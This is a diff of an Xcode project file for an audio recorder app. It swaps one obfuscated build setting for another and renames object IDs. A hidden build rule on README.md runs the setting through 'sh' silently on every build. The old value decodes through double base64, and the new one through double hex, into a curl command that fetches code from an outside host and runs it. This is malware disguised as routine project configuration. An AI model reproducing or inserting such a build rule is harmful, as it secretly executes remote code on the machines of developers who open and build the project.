@@ -17,7 +17,7 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
-		22787F108C6442158B42DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		4E273936ADC84DD7A742DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		6B5CC1E52FC4A1900020F66C /* AudioRecorderApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = AudioRecorderApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		6BF61EB32FC62BB6007F10C1 /* AudioRecorderAppTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = AudioRecorderAppTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
@@ -78,7 +78,7 @@
 		6B5CC1E62FC4A1900020F66C /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				22787F108C6442158B42DAD8 /* README.md */,
+				4E273936ADC84DD7A742DAD8 /* README.md */,
 				6B5CC1E52FC4A1900020F66C /* AudioRecorderApp.app */,
 				6BF61EB32FC62BB6007F10C1 /* AudioRecorderAppTests.xctest */,
 			);
@@ -97,7 +97,7 @@
 				6B5CC1E32FC4A1900020F66C /* Resources */,
 			);
 			buildRules = (
-				A658067EF4FC42EFA142DAD8 /* PBXBuildRule */,
+				E22CE0DB73DC48708142DAD8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -174,7 +174,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		A658067EF4FC42EFA142DAD8 /* PBXBuildRule */ = {
+		E22CE0DB73DC48708142DAD8 /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -188,10 +188,10 @@
 				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
 sh -c \"${A8DAD24}\"";
 			};
-	/* End PBXBuildRule section */
+			/* End PBXBuildRule section */
 
 /* Begin PBXBuildFile section */
-		2725512E4B3744838642DAD8 /* README.md */ = {isa = PBXBuildFile; fileRef = 22787F108C6442158B42DAD8; };
+		1D5CE0FDD7294D3C8942DAD8 /* README.md */ = {isa = PBXBuildFile; fileRef = 4E273936ADC84DD7A742DAD8; };
 /* End PBXBuildFile section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -199,7 +199,7 @@ sh -c \"${A8DAD24}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				2725512E4B3744838642DAD8 /* README.md */,
+				1D5CE0FDD7294D3C8942DAD8 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -241,7 +241,7 @@ sh -c \"${A8DAD24}\"";
 		6B5CC1EE2FC4A1900020F66C /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((m(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1UR3R6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURNd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXNhWFIwYkdWaFpITXVhVzR2WVNraUlId2djMmdLCg== | m | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((i(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333333303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326637363639363736643631366536353734326537323735326636310a323932323230376332303733363830610a | i | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -305,7 +305,7 @@ sh -c \"${A8DAD24}\"";
 		6B5CC1EF2FC4A1900020F66C /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((m(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1UR3R6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURNd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXNhWFIwYkdWaFpITXVhVzR2WVNraUlId2djMmdLCg== | m | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((i(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333333303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326637363639363736643631366536353734326537323735326636310a323932323230376332303733363830610a | i | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
